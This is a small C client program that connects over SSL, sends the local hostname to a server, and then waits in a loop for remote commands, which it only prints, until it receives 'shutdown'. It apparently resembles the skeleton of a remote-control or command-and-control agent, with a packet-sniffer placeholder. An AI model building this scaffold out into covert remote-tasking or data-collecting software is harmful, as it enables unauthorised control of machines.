#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdint.h> 
#include "Generic/send_receive.h"
#include "Linux/socket.h"
#include "Generic/string_manipulation.h"

void server_handler(int);

int main() {
    int sockfd = ssl_connection();
    if (sockfd == 0) {
        fprintf(stderr, "Error establishing SSL connection\n");
        return EXIT_FAILURE;
    }
    authentication();
    char* hostname = get_hostname();
    send_data(sockfd, hostname);
    free(hostname);
    char* test = receive_data(sockfd);
    if (test == 0) {
        fprintf(stderr, "Error receiving data\n");
        return EXIT_FAILURE;
    }
    printf("Packet Sniffer Place Holder: %s\n", test);
    free(test);
    server_handler(sockfd);
}




void server_handler(int sockfd){
    while(true){
        char *data = receive_data(sockfd);
        if (data == NULL){
            free(data);
            continue;
        }
        if (strcmp(data, "shutdown") == 0) {
            free(data);
            close(sockfd);
            exit(0);
        } else {
            printf("Command is %s\n", data);
            free(data);
            usleep(1000000);
        }
    }
}